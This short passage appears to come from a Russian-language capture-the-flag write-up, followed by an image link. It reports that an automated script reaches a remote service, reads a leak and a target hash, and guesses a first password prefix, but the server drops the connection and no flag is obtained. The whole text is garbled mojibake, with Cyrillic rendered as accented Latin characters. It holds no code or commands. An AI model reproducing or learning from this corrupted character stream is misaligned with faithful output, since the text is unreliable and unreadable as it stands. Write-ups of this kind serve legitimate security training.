ÐŸÑ€Ð¸ Ð·Ð°Ð¿ÑƒÑÐºÐµ ÑÐºÑ€Ð¸Ð¿Ñ‚Ð° ÑƒÐ´Ð°Ð»Ñ‘Ð½Ð½Ð¾Ðµ ÑÐ¾ÐµÐ´Ð¸Ð½ÐµÐ½Ð¸Ðµ Ñ ÑÐµÑ€Ð²ÐµÑ€Ð¾Ð¼ ÑƒÑÑ‚Ð°Ð½Ð°Ð²Ð»Ð¸Ð²Ð°ÐµÑ‚ÑÑ, ÑƒÑ‚ÐµÑ‡ÐºÐ° Ð¸ Ñ†ÐµÐ»ÐµÐ²Ð¾Ð¹ Ñ…ÐµÑˆ ÑƒÑÐ¿ÐµÑˆÐ½Ð¾ ÑÑ‡Ð¸Ñ‚Ñ‹Ð²Ð°ÑŽÑ‚ÑÑ, Ð° Ð¿ÐµÑ€Ð²Ñ‹Ð¹ Ð¿Ñ€ÐµÑ„Ð¸ÐºÑ Ð¿Ð°Ñ€Ð¾Ð»Ñ ÐºÐ¾Ñ€Ñ€ÐµÐºÑ‚Ð½Ð¾ Ð¿Ð¾Ð´Ð±Ð¸Ñ€Ð°ÐµÑ‚ÑÑ Ð¸ Ð¾Ñ‚Ð¿Ñ€Ð°Ð²Ð»ÑÐµÑ‚ÑÑ. ÐžÐ´Ð½Ð°ÐºÐ¾ Ð¿Ð¾ÑÐ»Ðµ Ð¿ÐµÑ€ÐµÑ…Ð¾Ð´Ð° Ðº ÑÐ»ÐµÐ´ÑƒÑŽÑ‰ÐµÐ¼Ñƒ ÑÑ‚Ð°Ð¿Ñƒ ÑÐµÑ€Ð²ÐµÑ€ Ñ€Ð°Ð·Ñ€Ñ‹Ð²Ð°ÐµÑ‚ ÑÐ¾ÐµÐ´Ð¸Ð½ÐµÐ½Ð¸Ðµ. Ð¢Ð°ÐºÐ¸Ð¼ Ð¾Ð±Ñ€Ð°Ð·Ð¾Ð¼, Ð½ÐµÑÐ¼Ð¾Ñ‚Ñ€Ñ Ð½Ð° Ñ€ÐµÐ°Ð»Ð¸Ð·Ð¾Ð²Ð°Ð½Ð½ÑƒÑŽ Ð»Ð¾Ð³Ð¸ÐºÑƒ Ð´Ð»Ñ Ð²ÑÐµÑ… ÑƒÑ€Ð¾Ð²Ð½ÐµÐ¹, Ð°Ð²Ñ‚Ð¾Ð¼Ð°Ñ‚Ð¸Ð·Ð¸Ñ€Ð¾Ð²Ð°Ð½Ð½Ð¾Ðµ Ð¿Ñ€Ð¾Ñ…Ð¾Ð¶Ð´ÐµÐ½Ð¸Ðµ Ð¿Ñ€ÐµÑ€Ñ‹Ð²Ð°ÐµÑ‚ÑÑ Ð½Ð° ÑÐµÑ€ÐµÐ´Ð¸Ð½Ðµ Ð´Ð¸Ð°Ð»Ð¾Ð³Ð° Ñ ÑÐµÑ€Ð²Ð¸ÑÐ¾Ð¼, Ð¸ Ñ„Ð»Ð°Ð³ Ð¿Ð¾Ð»ÑƒÑ‡ÐµÐ½ Ð½Ðµ Ð±Ñ‹Ð».

![](img/7/14.png)
